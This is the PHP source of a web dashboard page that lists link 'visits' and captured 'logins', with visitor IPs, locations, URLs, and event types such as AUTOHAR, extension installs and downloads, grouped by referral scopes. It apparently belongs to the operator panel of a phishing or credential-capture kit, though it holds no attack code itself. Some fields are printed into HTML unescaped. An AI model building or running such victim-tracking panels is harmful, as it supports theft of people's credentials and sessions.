<?php
if (session_status() !== PHP_SESSION_ACTIVE) {
    session_name('token');
    session_start();
}

include '../libs/configuration.php';
/* libs/functions.php is no longer loaded */
include '../libs/connection.php';
// Cache TAMAMEN kaldırıldı; her istek anlık DB'den okunur, toplam sayaç
// WebSocket 'sidebar' kanalıyla anlık senkron olur.
if (!defined('ULTIMA_QUERY_CACHE_TTL')) define('ULTIMA_QUERY_CACHE_TTL', 0);

if (!function_exists('ultimaPageQuery')) {
function ultimaPageQuery($sql, $params = [], $ttl = null) {
    global $db, $pdo;
    $conn = (isset($db) && $db instanceof PDO) ? $db : ((isset($pdo) && $pdo instanceof PDO) ? $pdo : null);
    if (!$conn) {
        return [];
    }

    $blockedKeywords = ['DROP', 'TRUNCATE', 'GRANT', 'ALTER', 'CREATE'];
    foreach ($blockedKeywords as $keyword) {
        if (preg_match('/\b' . preg_quote($keyword, '/') . '\b/i', $sql)) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $conn->prepare($sql);
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        return [];
    }
}
}


function getTriplehookScopeIdsCached($linkId) {
    // Cache kaldırıldı — anlık scope.
    $rows = ultimaPageQuery(
        "SELECT link_id FROM regular WHERE referred_by = :link_id
         UNION
         SELECT r2.link_id FROM regular r2 WHERE r2.referred_by IN (
            SELECT td.link_id FROM triplehook_data td
            INNER JOIN regular r ON r.link_id = td.link_id
            WHERE r.referred_by = :link_id2
         )",
        [':link_id' => $linkId, ':link_id2' => $linkId]
    );
    $ids = [];
    if (is_array($rows)) {
        foreach ($rows as $row) {
            if (isset($row['link_id']) && $row['link_id'] !== '') {
                $ids[] = (string)$row['link_id'];
            }
        }
    }
    $ids[] = (string)$linkId;
    return array_values(array_unique(array_filter($ids)));
}
$sessionAuthCode = trim((string)($_SESSION['auth_code'] ?? ''));

if ($sessionAuthCode === '') {
    header('Location: /');
    exit();
}

$result = ultimaPageQuery(
    "SELECT * FROM regular WHERE auth_code = :auth_code LIMIT 1",
    [':auth_code' => $sessionAuthCode],
    0
);
$userData = !empty($result) ? $result[0] : null;

if (!$userData) {
    header('Location: /');
    exit();
}

$_SESSION['auth_code'] = $userData['auth_code'] ?? $sessionAuthCode;
$_SESSION['link_id'] = $userData['link_id'];

$currentPage = 'visits';
$link_id = $userData['link_id'] ?? 0;
$isTriplehook = (int)($userData['triplehook'] ?? 0) === 1;
$_SESSION['triplehook'] = $isTriplehook ? 'True' : 'False';

// Cache YOK — anlık DB kontrolü.
$triplehookCheck = ultimaPageQuery("SELECT 1 FROM triplehook_data WHERE link_id=:link_id LIMIT 1", [':link_id' => $link_id]);
$hasTriplehook = !empty($triplehookCheck);
$_SESSION['triplehook'] = $isTriplehook ? 'True' : 'False';


$page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
$perPage = 15;
$offset = ($page - 1) * $perPage;

if($isTriplehook){
    $scopeIds = getTriplehookScopeIdsCached($link_id);
} else {
    $scopeIds = [(string)$link_id];
}
if (session_status() === PHP_SESSION_ACTIVE) {
    session_write_close();
}

$prm = [];
$inSql = '';
if (!empty($scopeIds)) {
    $ph = [];
    foreach (array_values($scopeIds) as $i => $lid) {
        $k = ':sid' . $i;
        $ph[] = $k;
        $prm[$k] = $lid;
    }
    $inSql = implode(',', $ph);
}

// Toplam sayaç — sidebar formülüyle birebir aynı (views + login_clicks).
// Anlık SQL COUNT; WS 'sidebar' kanalı yeni visit'te bu değeri günceller.
if ($inSql !== '') {
    $countResult = ultimaPageQuery(
        "SELECT
            (SELECT COUNT(*) FROM views WHERE link_id IN ($inSql)) as views_total,
            (SELECT COUNT(*) FROM login_clicks WHERE link_id IN ($inSql)) as clicks_total",
        $prm
    );
    $totalViews = (int)($countResult[0]['views_total'] ?? 0);
    $totalClicks = (int)($countResult[0]['clicks_total'] ?? 0);
    $totalRecords = $totalViews + $totalClicks;
} else {
    $totalViews = 0;
    $totalClicks = 0;
    $totalRecords = 0;
}
$totalPages = max(1, (int)ceil(max($totalRecords, 1) / $perPage));

$visitsData = [];
if ($inSql !== '') {
    $viewsSql = "SELECT ip_address, country, city, COALESCE(type, 'link') as type, current_url, created_at FROM views WHERE link_id IN ($inSql) ORDER BY created_at DESC LIMIT {$perPage} OFFSET {$offset}";
    $clicksSql = "SELECT ip_address, country, city, CASE WHEN type LIKE '%DOWNLOADING%' THEN type WHEN type LIKE 'Extension%' THEN type WHEN type = 'AutoHar' THEN 'AUTOHAR' ELSE 'login' END as type, current_url, created_at FROM login_clicks WHERE link_id IN ($inSql) ORDER BY created_at DESC LIMIT {$perPage} OFFSET {$offset}";
    $viewRows = ultimaPageQuery($viewsSql, $prm);
    $clickRows = ultimaPageQuery($clicksSql, $prm);
    if (!is_array($viewRows)) $viewRows = [];
    if (!is_array($clickRows)) $clickRows = [];
    $visitsData = array_merge($viewRows, $clickRows);
    usort($visitsData, function($a, $b) {
        return strcmp((string)($b['created_at'] ?? ''), (string)($a['created_at'] ?? ''));
    });
    $visitsData = array_slice($visitsData, 0, $perPage);
}

ob_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Visits</title>
    <link rel="icon" type="image/png" href="/images/favicon.png">
    <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
    <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;500;700&display=swap" onload="this.rel='stylesheet'">
    <noscript><link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet"></noscript>
    <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" onload="this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"></noscript>
    <style>
        :root {
            --dark-bg: #07070b;
            --darker-bg: #050507;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Rajdhani', sans-serif;
            background: var(--dark-bg);
            color: #fff;
            min-height: 100vh;
            overflow-x: hidden;
        }

        #realBootBg {
            position: fixed;
            inset: 0;
            width: 100vw;
            height: 100vh;
            pointer-events: none;
            z-index: 0;
            transition: opacity .25s ease;
        }

        .animated-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }

        .animated-bg .grid-overlay,
        .animated-bg .glow-orb,
        .animated-bg .lightning,
        .animated-bg .geo-container,
        .animated-bg .geo-line,
        .animated-bg .connection-point,
        .animated-bg .particle { display: none !important; }

        .grid-overlay {
            position: absolute;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
            background-size: 50px 50px;
        }

        .glow-orb {
            position: absolute;
            border-radius: 50%;
            filter: blur(100px);
            opacity: 0.08;
            animation: float 20s ease-in-out infinite;
        }

        .glow-orb:nth-child(1) {
            width: 400px;
            height: 400px;
            background: #fff;
            top: -100px;
            right: -100px;
        }

        .glow-orb:nth-child(2) {
            width: 300px;
            height: 300px;
            background: #888;
            bottom: -50px;
            left: -50px;
            animation-delay: -10s;
        }

        @keyframes float {
            0%, 100% { transform: translate(0, 0); }
            50% { transform: translate(30px, 30px); }
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideInLeft {
            from {
                opacity: 0;
                transform: translateX(-15px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        @keyframes scaleIn {
            from {
                opacity: 0;
                transform: scale(0.97);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .container { display: flex; min-height: 100vh; position: relative; z-index: 1; }

        .main-content {
            margin-left: 70px;
            padding: 25px 20px;
            flex: 1;
            transition: margin-left 0.4s ease;
            width: calc(100% - 70px);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .main-content.no-transition { transition: none !important; }
        .main-content.no-transition .page-header,
        .main-content.no-transition .table-wrapper,
        .main-content.no-transition .table-container,
        .main-content.no-transition .pagination,
        .main-content.no-transition tbody tr,
        .main-content.no-transition .data-table tbody tr {
            animation: none !important;
            opacity: 1 !important;
        }
        .main-content.no-transition .page-header,
        .main-content.no-transition .table-container,
        .main-content.no-transition tbody tr {
            animation: none !important;
            opacity: 1 !important;
        }

        .content-wrapper {
            width: 100%;
            max-width: 1100px;
        }

        .page-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 0;
            border-bottom: none;
            animation: fadeIn 0.12s ease forwards;
            opacity: 0;
        }

        .stats-info {
            display: flex;
            gap: 25px;
        }

        .stat-item {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #555;
            font-size: 0.85rem;
        }

        .stat-item strong {
            color: #777;
        }

        .table-container {
            border: none;
            border-radius: 0;
            overflow: hidden;
            background: transparent;
            animation: scaleIn 0.14s ease forwards;
            animation-delay: 0.01s;
            opacity: 0;
        }

        .table-scroll {
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 700px;
        }

        thead tr {
            border-bottom: 1px solid rgba(255,255,255,0.04);
        }

        th {
            padding: 14px 12px;
            text-align: left;
            font-size: 0.7rem;
            font-weight: 600;
            color: #444;
            text-transform: uppercase;
            letter-spacing: 1px;
            background: transparent;
        }

        tbody tr {
            border-bottom: 1px solid rgba(255,255,255,0.03);
            transition: background 0.2s ease;
            opacity: 1;
        }


        tbody tr:last-child {
            border-bottom: none;
        }

        td {
            padding: 12px 12px;
            font-size: 0.85rem;
            color: rgba(180, 180, 200, 0.75);
            text-shadow: 0 0 6px rgba(180, 180, 200, 0.2);
        }

        .ip-cell {
            font-family: 'Consolas', monospace;
            color: rgba(200, 200, 220, 0.8);
            font-size: 0.8rem;
            text-shadow: 0 0 8px rgba(200, 200, 220, 0.3);
        }

        .type-badge {
            font-size: 0.75rem;
            font-weight: 600;
            padding: 0;
            background: transparent;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .type-badge.login {
            color: rgba(255, 120, 120, 0.8);
        }

        .type-badge.link {
            color: rgba(120, 160, 255, 0.8);
        }

        .type-badge.AUTOHAR {
            color: rgba(200, 200, 200, 0.9);
        }

        .type-badge.extension {
            color: rgba(180, 130, 255, 0.9);
        }

        .type-badge.downloading {
            color: rgba(200, 100, 180, 0.9);
        }

        tbody tr.row-login {
            background: rgba(255, 100, 100, 0.015);
        }
        tbody tr.row-login:hover {
            background: rgba(255, 100, 100, 0.035);
        }
        tbody tr.row-login td {
            color: rgba(220, 180, 180, 0.75);
            text-shadow: 0 0 6px rgba(255, 150, 150, 0.15);
        }
        tbody tr.row-login .ip-cell {
            color: rgba(240, 190, 190, 0.8);
            text-shadow: 0 0 8px rgba(255, 150, 150, 0.25);
        }
        tbody tr.row-link {
            background: rgba(100, 150, 255, 0.015);
        }
        tbody tr.row-link:hover {
            background: rgba(100, 150, 255, 0.035);
        }
        tbody tr.row-link td {
            color: rgba(180, 190, 220, 0.75);
            text-shadow: 0 0 6px rgba(150, 180, 255, 0.15);
        }
        tbody tr.row-link .ip-cell {
            color: rgba(190, 200, 240, 0.8);
            text-shadow: 0 0 8px rgba(150, 180, 255, 0.25);
        }
        tbody tr.row-AUTOHAR {
            background: rgba(200, 200, 200, 0.015);
        }
        tbody tr.row-AUTOHAR:hover {
            background: rgba(200, 200, 200, 0.035);
        }
        tbody tr.row-AUTOHAR td {
            color: rgba(200, 200, 200, 0.75);
            text-shadow: 0 0 6px rgba(200, 200, 200, 0.15);
        }
        tbody tr.row-AUTOHAR .ip-cell {
            color: rgba(210, 210, 210, 0.8);
            text-shadow: 0 0 8px rgba(200, 200, 200, 0.25);
        }
        tbody tr.row-extension {
            background: rgba(160, 100, 255, 0.015);
        }
        tbody tr.row-extension:hover {
            background: rgba(160, 100, 255, 0.035);
        }
        tbody tr.row-extension td {
            color: rgba(200, 180, 230, 0.75);
            text-shadow: 0 0 6px rgba(160, 100, 255, 0.15);
        }
        tbody tr.row-extension .ip-cell {
            color: rgba(210, 190, 240, 0.8);
            text-shadow: 0 0 8px rgba(160, 100, 255, 0.25);
        }
        tbody tr.row-downloading {
            background: rgba(200, 100, 180, 0.015);
        }
        tbody tr.row-downloading:hover {
            background: rgba(200, 100, 180, 0.035);
        }
        tbody tr.row-downloading td {
            color: rgba(220, 180, 210, 0.75);
            text-shadow: 0 0 6px rgba(200, 100, 180, 0.15);
        }
        tbody tr.row-downloading .ip-cell {
            color: rgba(230, 190, 220, 0.8);
            text-shadow: 0 0 8px rgba(200, 100, 180, 0.25);
        }

        .url-cell {
            display: flex;
            align-items: center;
            gap: 6px;
            max-width: 200px;
        }

        .url-text {
            flex: 1;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            color: rgba(150, 180, 220, 0.7);
            font-size: 0.8rem;
            text-shadow: 0 0 8px rgba(150, 180, 220, 0.25);
        }

        tbody tr.row-login .url-text {
            color: rgba(220, 170, 170, 0.7);
            text-shadow: 0 0 8px rgba(255, 150, 150, 0.2);
        }
        tbody tr.row-link .url-text {
            color: rgba(170, 190, 230, 0.7);
            text-shadow: 0 0 8px rgba(150, 180, 255, 0.2);
        }
        tbody tr.row-AUTOHAR .url-text {
            color: rgba(190, 190, 190, 0.7);
            text-shadow: 0 0 8px rgba(200, 200, 200, 0.2);
        }
        tbody tr.row-extension .url-text {
            color: rgba(190, 170, 230, 0.7);
            text-shadow: 0 0 8px rgba(160, 100, 255, 0.2);
        }
        tbody tr.row-downloading .url-text {
            color: rgba(210, 170, 200, 0.7);
            text-shadow: 0 0 8px rgba(200, 100, 180, 0.2);
        }

        .copy-btn {
            background: transparent;
            border: none;
            color: #9aa0b0;
            cursor: pointer;
            padding: 4px;
            transition: all 0.2s ease;
        }

        .copy-btn:hover {
            color: #888;
            text-shadow: 0 0 8px rgba(255,255,255,0.3);
        }

        tbody tr.row-login .copy-btn:hover {
            color: rgba(255, 150, 150, 0.8);
            text-shadow: 0 0 8px rgba(255, 150, 150, 0.4);
        }
        tbody tr.row-link .copy-btn:hover {
            color: rgba(150, 180, 255, 0.8);
            text-shadow: 0 0 8px rgba(150, 180, 255, 0.4);
        }
        tbody tr.row-AUTOHAR .copy-btn:hover {
            color: rgba(200, 200, 200, 0.8);
            text-shadow: 0 0 8px rgba(200, 200, 200, 0.4);
        }
        tbody tr.row-extension .copy-btn:hover {
            color: rgba(180, 130, 255, 0.8);
            text-shadow: 0 0 8px rgba(160, 100, 255, 0.4);
        }
        tbody tr.row-downloading .copy-btn:hover {
            color: rgba(200, 100, 180, 0.8);
            text-shadow: 0 0 8px rgba(200, 100, 180, 0.4);
        }

        .date-cell {
            color: rgba(160, 170, 190, 0.7);
            font-size: 0.8rem;
            white-space: nowrap;
            text-shadow: 0 0 6px rgba(160, 170, 190, 0.2);
        }

        tbody tr.row-login .date-cell {
            color: rgba(200, 160, 160, 0.7);
            text-shadow: 0 0 6px rgba(255, 150, 150, 0.15);
        }
        tbody tr.row-link .date-cell {
            color: rgba(160, 175, 200, 0.7);
            text-shadow: 0 0 6px rgba(150, 180, 255, 0.15);
        }
        tbody tr.row-AUTOHAR .date-cell {
            color: rgba(180, 180, 180, 0.7);
            text-shadow: 0 0 6px rgba(200, 200, 200, 0.15);
        }
        tbody tr.row-extension .date-cell {
            color: rgba(190, 170, 210, 0.7);
            text-shadow: 0 0 6px rgba(160, 100, 255, 0.15);
        }
        tbody tr.row-downloading .date-cell {
            color: rgba(210, 170, 200, 0.7);
            text-shadow: 0 0 6px rgba(200, 100, 180, 0.15);
        }

        .stats-row {
            display: flex;
            gap: 20px;
        }
        .stat-box {
            padding: 0;
            border: none;
            background: transparent;
        }
        .stat-box label {
            font-size: 0.65rem;
            color: #444;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }
        .stat-box strong {
            display: block;
            font-size: 1.1rem;
            color: #666;
            margin-top: 2px;
        }
        .pagination {
            display: flex;
            justify-content: center;
            gap: 4px;
            margin-top: 25px;
            flex-wrap: wrap;
            opacity: 1 !important;
            visibility: visible !important;
        }
        .page-link {
            padding: 8px 12px;
            background: transparent;
            border: none;
            border-radius: 6px;
            color: #444;
            font-family: 'Rajdhani', sans-serif;
            font-size: 0.85rem;
            font-weight: 500;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.2s ease;
        }
        .page-link:hover {
            color: #777;
        }
        .page-link.active {
            color: #999;
            background: rgba(255,255,255,0.03);
        }
        .page-link.disabled {
            opacity: 0.3;
            cursor: not-allowed;
            pointer-events: none;
        }
        




        .empty-state {
            text-align: center;
            padding: 80px 20px;
            color: #444;
        }

        .empty-state p {
            font-size: 0.9rem;
            color: #555;
        }

        .toast {
            position: fixed;
            bottom: -60px;
            left: 50%;
            transform: translateX(-50%);
            padding: 12px 24px;
            background: rgba(10,10,15,0.9);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 8px;
            color: #777;
            font-size: 0.85rem;
            display: flex;
            align-items: center;
            gap: 8px;
            z-index: 1000;
            transition: bottom 0.3s ease;
        }

        .toast.show { bottom: 25px; }
        .toast i { color: rgba(0, 210, 106, 0.6); }

        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 2px; }
        ::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.2); }

        @media (max-width: 768px) {
            .main-content { margin-left: 0; padding: 15px 10px; width: 100%; }
            .page-header { flex-direction: column; gap: 15px; align-items: flex-start; }
            .stats-info { flex-wrap: wrap; }
        }
    

</style>
</head>
<body>
<canvas id="realBootBg" aria-hidden="true"></canvas>
<script>
(function(){
    var canvas = document.getElementById('realBootBg');
    if(!canvas) return;
    var ctx = canvas.getContext('2d');
    var W, H, dots = [];
    var isMobile = window.innerWidth < 768;
    var reducedMotion = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    var COUNT = reducedMotion ? 0 : (isMobile ? 120 : 220);
    var DOTS_STATE_KEY = 'ultimaBgDotsStateV3';
    function isReloadNav(){
        try{
            var nav = performance.getEntriesByType && performance.getEntriesByType('navigation')[0];
            return !!(nav && nav.type === 'reload');
        }catch(e){
            return false;
        }
    }
    function restoreSavedDots(limit){
        try{
            if(isReloadNav()) return [];
            var saved = JSON.parse(sessionStorage.getItem(DOTS_STATE_KEY) || 'null');
            if(!saved || !Array.isArray(saved.d) || Date.now() - (saved.t || 0) > 60000) return [];
            var sx = saved.w || W;
            var sy = saved.h || H;
            return saved.d.slice(0, limit).map(function(item){
                var d = copyDot(item);
                if(sx && sy){
                    d.x = d.x / sx * W;
                    d.y = d.y / sy * H;
                }
                return d;
            });
        }catch(e){
            return [];
        }
    }
    function saveDots(){
        try{
            sessionStorage.setItem(DOTS_STATE_KEY, JSON.stringify({t: Date.now(), w: W, h: H, d: dots.slice(0, 500)}));
        }catch(e){}
    }
    window.addEventListener('pagehide', saveDots);
    window.addEventListener('beforeunload', saveDots);
    function copyDot(d){
        return {
            x: d.x || 0,
            y: d.y || 0,
            vx: typeof d.vx === 'number' ? d.vx : 0,
            vy: typeof d.vy === 'number' ? d.vy : 0,
            r: d.r || 0.6,
            baseAlpha: typeof d.baseAlpha === 'number' ? d.baseAlpha : (typeof d.a === 'number' ? d.a : 0.12),
            phase: typeof d.phase === 'number' ? d.phase : (typeof d.p === 'number' ? d.p : 0)
        };
    }
    function makeDot(){
        return {
            x: Math.random() * W,
            y: Math.random() * H,
            vx: (Math.random() - 0.5) * 0.12,
            vy: (Math.random() - 0.5) * 0.12,
            r: Math.random() * 0.9 + 0.35,
            baseAlpha: Math.random() * 0.10 + 0.12,
            phase: Math.random() * Math.PI * 2
        };
    }
    function syncDots(){
        window.__ultimaBgDots = dots;
        window.__ultimaBootDots = dots;
    }
    function resize(){
        W = canvas.width = window.innerWidth || document.documentElement.clientWidth || 1;
        H = canvas.height = window.innerHeight || document.documentElement.clientHeight || 1;
    }
    resize();
    if(COUNT && window.__ultimaBgDots && window.__ultimaBgDots.length){
        dots = window.__ultimaBgDots.slice(0, COUNT).map(copyDot);
    }else if(COUNT && window.__ultimaBootDots && window.__ultimaBootDots.length){
        dots = window.__ultimaBootDots.slice(0, COUNT).map(copyDot);
    }else if(COUNT){
        var savedDots = restoreSavedDots(COUNT);
        if(savedDots.length) dots = savedDots;
    }
        if(!dots.length){while(dots.length<COUNT)dots.push(makeDot());}
    syncDots();
    if(!COUNT) return;
    function animate(){
        if(!document.getElementById('realBootBg')) return;
        ctx.clearRect(0, 0, W, H);
        var t = Date.now() * 0.001;
        for(var i = 0; i < dots.length; i++){
            var d = dots[i];
            d.x += d.vx;
            d.y += d.vy;
            if(d.x < 0) d.x = W;
            if(d.x > W) d.x = 0;
            if(d.y < 0) d.y = H;
            if(d.y > H) d.y = 0;
            var flicker = Math.min(1, Math.max(0.08, d.baseAlpha + Math.sin(t * 0.22 + d.phase) * 0.03));
            ctx.beginPath();
            ctx.arc(d.x, d.y, d.r, 0, Math.PI * 2);
            ctx.fillStyle = 'rgba(255,255,255,' + flicker + ')';
            ctx.fill();
        }
        syncDots();
        requestAnimationFrame(animate);
    }
    if(!window.__ultimaStarsLive){window.__ultimaStarsLive=1;animate();}
    var resizeTimer;
    window.addEventListener('resize', function(){
        clearTimeout(resizeTimer);
        resizeTimer = setTimeout(function(){
            resize();
            syncDots();
        }, 150);
    });
})();
</script>
<?php include '../includes/dashboard/header.php'; ?>


    <div class="animated-bg">
        <div class="grid-overlay"></div>
        <div class="glow-orb"></div>
        <div class="glow-orb"></div>
    </div>

    <div class="container">
        <?php 
        $sidebarCollapsed = isset($userData['sidebar_collapsed']) && $userData['sidebar_collapsed'] == 1;
        $skipSidebarCounts = true;
        include '../includes/dashboard/sidebar.php'; 
        ?>

        <main class="main-content no-transition">
            <div class="content-wrapper">
            <div class="page-header">
                <div class="stats-row">
                    <div class="stat-box">
                        <label>Views</label>
                        <strong id="visitsLiveViews"><?= number_format($totalViews) ?></strong>
                    </div>
                    <div class="stat-box">
                        <label>Logins</label>
                        <strong id="visitsLiveLogins"><?= number_format($totalClicks) ?></strong>
                    </div>
                    <div class="stat-box">
                        <label>Page</label>
                        <strong id="visitsPageLabel"><?= (int)$page ?> / <?= (int)max(1,$totalPages) ?></strong>
                    </div>
                </div>
            </div>

            <div class="table-container" id="visitsLiveTable">
                <?php if (empty($visitsData)): ?>
                <div class="empty-state">
                    <p>No visits recorded yet</p>
                </div>
                <?php else: ?>
                <div class="table-scroll">
                    <table>
                        <thead>
                            <tr>
                                <th>IP</th>
                                <th>Country</th>
                                <th>City</th>
                                <th>Type</th>
                                <th>Link</th>
                                <th>Date</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($visitsData as $visit): 
                                $typeClass = $visit['type'];
                                if (stripos($visit['type'], 'DOWNLOADING') !== false) $typeClass = 'downloading';
                                elseif (stripos($visit['type'], 'Extension') !== false) $typeClass = 'extension';
                            ?>
                            <tr class="row-<?= $typeClass ?>">
                                <td class="ip-cell"><?= htmlspecialchars($visit['ip_address'] ?? '-') ?></td>
                                <td><?= htmlspecialchars($visit['country'] ?? '-') ?></td>
                                <td><?= htmlspecialchars($visit['city'] ?? '-') ?></td>
                                <td>
                                    <span class="type-badge <?= $typeClass ?>">
                                        <?= strtoupper($visit['type']) ?>
                                    </span>
                                </td>
                                <td>
                                    <div class="url-cell">
                                        <span class="url-text" title="<?= htmlspecialchars($visit['current_url'] ?? '') ?>">
                                            <?= htmlspecialchars($visit['current_url'] ?? '-') ?>
                                        </span>
                                        <?php if (!empty($visit['current_url'])): ?>
                                        <button class="copy-btn" onclick="copyUrl('<?= htmlspecialchars($visit['current_url'], ENT_QUOTES) ?>')">
                                            <i class="fas fa-copy"></i>
                                        </button>
                                        <?php endif; ?>
                                    </div>
                                </td>
                                <td class="date-cell"><?= $visit['created_at'] ?? '-' ?></td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
                <?php endif; ?>
            </div>

            <div class="pagination" id="visitsPagination">
                <a href="?page=<?= max(1, $page - 1) ?>" class="page-link <?= $page <= 1 ? 'disabled' : '' ?>">
                    <i class="fas fa-chevron-left"></i>
                </a>
                <?php
                $start = max(1, $page - 2);
                $end = min($totalPages, $page + 2);
                if ($start > 1): ?>
                    <a href="?page=1" class="page-link">1</a>
                    <?php if ($start > 2): ?><span class="page-link disabled">...</span><?php endif; ?>
                <?php endif; ?>
                <?php for ($i = $start; $i <= $end; $i++): ?>
                    <a href="?page=<?= $i ?>" class="page-link <?= $i == $page ? 'active' : '' ?>"><?= $i ?></a>
                <?php endfor; ?>
                <?php if ($end < $totalPages): ?>
                    <?php if ($end < $totalPages - 1): ?><span class="page-link disabled">...</span><?php endif; ?>
                    <a href="?page=<?= $totalPages ?>" class="page-link"><?= $totalPages ?></a>
                <?php endif; ?>
                <a href="?page=<?= min($totalPages, $page + 1) ?>" class="page-link <?= $page >= $totalPages ? 'disabled' : '' ?>">
                    <i class="fas fa-chevron-right"></i>
                </a>
            </div>
            </div>
        </main>
    </div>

    <div class="toast" id="toast">
        <i class="fas fa-check"></i>
        <span>Copied!</span>
    </div>

    <script>
        function copyUrl(url) {
            navigator.clipboard.writeText(url).then(() => {
                const toast = document.getElementById('toast');
                toast.classList.add('show');
                setTimeout(() => toast.classList.remove('show'), 1500);
            });
        }
    </script>


    <script>
    (function(){
        var canvas = document.createElement('canvas');
        canvas.id = 'bgCanvas';
        canvas.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;pointer-events:none;z-index:0;';

        var container = document.querySelector('.container');
        if(!container) return;
        container.style.position = 'relative';
        document.body.insertBefore(canvas, document.body.firstChild);

        var animBg = document.querySelector('.animated-bg');
        if(animBg) animBg.remove();

        var ctx = canvas.getContext('2d');
        var W, H, dots = [];
        var isMobile = window.innerWidth < 768;
        var reducedMotion = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
        var COUNT = reducedMotion ? 0 : (isMobile ? 120 : 220);
    var DOTS_STATE_KEY = 'ultimaBgDotsStateV3';
    function isReloadNav(){
        try{
            var nav = performance.getEntriesByType && performance.getEntriesByType('navigation')[0];
            return !!(nav && nav.type === 'reload');
        }catch(e){
            return false;
        }
    }
    function restoreSavedDots(limit){
        try{
            if(isReloadNav()) return [];
            var saved = JSON.parse(sessionStorage.getItem(DOTS_STATE_KEY) || 'null');
            if(!saved || !Array.isArray(saved.d) || Date.now() - (saved.t || 0) > 60000) return [];
            var sx = saved.w || W;
            var sy = saved.h || H;
            return saved.d.slice(0, limit).map(function(item){
                var d = copyDot(item);
                if(sx && sy){
                    d.x = d.x / sx * W;
                    d.y = d.y / sy * H;
                }
                return d;
            });
        }catch(e){
            return [];
        }
    }
    function saveDots(){
        try{
            sessionStorage.setItem(DOTS_STATE_KEY, JSON.stringify({t: Date.now(), w: W, h: H, d: dots.slice(0, 500)}));
        }catch(e){}
    }
    window.addEventListener('pagehide', saveDots);
    window.addEventListener('beforeunload', saveDots);
        function copyDot(d){
            return {
                x: d.x || 0,
                y: d.y || 0,
                vx: typeof d.vx === 'number' ? d.vx : 0,
                vy: typeof d.vy === 'number' ? d.vy : 0,
                r: d.r || 0.6,
                baseAlpha: typeof d.baseAlpha === 'number' ? d.baseAlpha : (typeof d.a === 'number' ? d.a : 0.12),
                phase: typeof d.phase === 'number' ? d.phase : (typeof d.p === 'number' ? d.p : 0)
            };
        }
        function makeDot(){
            return {
                x: Math.random() * W,
                y: Math.random() * H,
                vx: (Math.random() - 0.5) * 0.12,
                vy: (Math.random() - 0.5) * 0.12,
                r: Math.random() * 0.9 + 0.35,
                baseAlpha: Math.random() * 0.10 + 0.12,
                phase: Math.random() * Math.PI * 2
            };
        }
        function syncDots(){
            window.__ultimaBgDots = dots;
            window.__ultimaBootDots = dots;
        }
        function resize(){
            W = canvas.width = window.innerWidth || document.documentElement.clientWidth || 1;
            H = canvas.height = window.innerHeight || document.documentElement.clientHeight || 1;
        }
        resize();

        function releaseRealBootBg(){
            var earlyBg = document.getElementById('realBootBg');
            if(!earlyBg) return;
            return;
        }

        if(!COUNT){
            syncDots();
            releaseRealBootBg();
            return;
        }

        if(window.__ultimaBgDots && window.__ultimaBgDots.length){
            dots = window.__ultimaBgDots.slice(0, COUNT).map(copyDot);
        }else if(window.__ultimaBootDots && window.__ultimaBootDots.length){
            dots = window.__ultimaBootDots.slice(0, COUNT).map(copyDot);
        }
        if(!dots.length){while(dots.length<COUNT)dots.push(makeDot());}
        syncDots();

        var realBgReady = false;

        function animate(){
            ctx.clearRect(0, 0, W, H);
            var t = Date.now() * 0.001;
            for(var i = 0; i < dots.length; i++){
                var d = dots[i];
                d.x += d.vx;
                d.y += d.vy;
                if(d.x < 0) d.x = W;
                if(d.x > W) d.x = 0;
                if(d.y < 0) d.y = H;
                if(d.y > H) d.y = 0;
                var flicker = Math.min(1, Math.max(0.08, d.baseAlpha + Math.sin(t * 0.22 + d.phase) * 0.03));
                ctx.beginPath();
